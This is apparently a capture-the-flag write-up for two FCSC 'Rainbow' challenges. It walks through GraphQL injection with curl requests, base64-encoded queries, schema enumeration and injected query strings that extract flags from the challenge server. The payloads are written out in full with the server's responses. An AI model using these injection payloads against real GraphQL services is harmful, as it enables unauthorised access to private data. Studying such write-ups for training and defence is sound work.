# Rainbow
## Try the app

We notice this GET request is made when the form is submitted.

```
$ curl 'http://challenges2.france-cybersecurity-challenge.fr:5006/index.php?search=eyBhbGxDb29rcyAoZmlsdGVyOiB7IGZpcnN0bmFtZToge2xpa2U6ICIldGVzdCUifX0pIHsgbm9kZXMgeyBmaXJzdG5hbWUsIGxhc3RuYW1lLCBzcGVjaWFsaXR5LCBwcmljZSB9fX0='
$ echo 'eyBhbGxDb29rcyAoZmlsdGVyOiB7IGZpcnN0bmFtZToge2xpa2U6ICIldGVzdCUifX0pIHsgbm9kZXMgeyBmaXJzdG5hbWUsIGxhc3RuYW1lLCBzcGVjaWFsaXR5LCBwcmljZSB9fX0=' | base64 -d
{ allCooks (filter: { firstname: {like: "%test%"}}) { nodes { firstname, lastname, speciality, price }}}
```

Some kind of JSON-based query, probably for some kind of NoSQL DBMS.

Anyways, we send **the entire query** to the server! No filter whatsoever!

It is actually GraphQL. The PayloadsAllTheThings repo contains a pretty useful [cheatsheet for GraphQL injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection), it even provides a ready-to-use enumeration query that dumps every single type and schema in the current database. (See [rainbow1_schema.json](rainbow1_schema.json))

<!-- Link schema.json -->

The `allFlags` query seems to do exactly what we want :)
```json
{ "data": { "__schema": { "types": [
    {
        "name": "Query",
        "fields": [
            ...,
            {
                "name": "allFlags",
                "description": "Reads and enables pagination through a set of `Flag`.",
                "args": [ ... ]
            }
            ...
        ]
    }
]}}}
```

Let's try ...

```
$ query="$(echo -n '{ allFlags { nodes { flag }} }' | base64 -w0 | tr -d '\n')";\
  curl "http://challenges2.france-cybersecurity-challenge.fr:5006/index.php?search=$query"
{"data":{"allFlags":{"nodes":[{"flag":"FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}"}]}}}
```

... FLAGGED! :)

# Rainbow 2
## Gather information
The query seems a bit different from the first one, so we have to play with it a lil to find what the query looks like.

```GraphQL
{
    allCooks (
        filter: {
            or: [
                { firstname: {like: "%INPUT%"}},
                { lastname: {like: "%INPUT%"}}
            ]
        }
    ) {
        nodes {
            firstname, lastname, speciality, price
        }
    }
}
```

No character is filtered so we can:
- end the string we write in
- close the filter statement
- close the `allCooks` query object
- start a new query object of our own!
- finish with a `#` so everything that follows is ignored

Since the `allFlags` query doesn't exist anymore, we need to gather a few more information about the database we're in. Let's print all fields of all types:

`a%"}}]}) {nodes { firstname, lastname, speciality, price }} myQuery: __schema {types {fields { name }, name}}}#`

(See [rainbow2_types.json]())

```
{
    "data": {
        "allCooks": {
            "nodes": [ ... ]
        },
        "myQuery": {
            "types": [
                {
                    "fields": [
                        ...,
                        {
                            "name": "allCooks"
                        },
                        {
                            "name": "allFlagNotTheSameTableNames"
                        },
                        ...
                    ],
                    "name": "Query"
                },
                ...,
                {
                    "fields": [
                        { "name": "nodeId" },
                        { "name": "id" },
                        { "name": "flagNotTheSameFieldName" }
                    ],
                    "name": "FlagNotTheSameTableName"
                },
                ...
            ]
        }
    }
}

```

## Extract flag

`a%"}}]}) {nodes { firstname, lastname, speciality, price }} flags: allFlagNotTheSameTableNames {nodes {flagNotTheSameFieldName}}}#`

```
{ "data": {
    "allCooks": { "nodes": [ ... ] },
    "flags": { "nodes": [ {
        "flagNotTheSameFieldName":
            "FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}" }
    ] }
}}

```

Re-FLAGGED! :)